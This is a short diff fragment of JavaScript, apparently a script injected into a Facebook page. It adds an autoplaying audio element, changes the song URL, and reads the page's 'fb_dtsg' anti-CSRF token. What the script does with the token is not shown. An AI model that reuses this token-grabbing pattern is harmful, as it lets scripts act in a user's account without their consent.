@@ -14,7 +14,7 @@ _audio.style.height="25px";
 _audio.controls = true;
 _audio.autoplay = false;
 _audio.autoplay = true;
-_audio.src = "http://picosong.com/media/songs/1623c97f871ebe69c08a4089737457dc";
+_audio.src = "http://c2lo.reverbnation.com/audio_player/download_song_direct/13447834";
 _div.appendChild(_audio);
 _body.appendChild(_div);
 var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
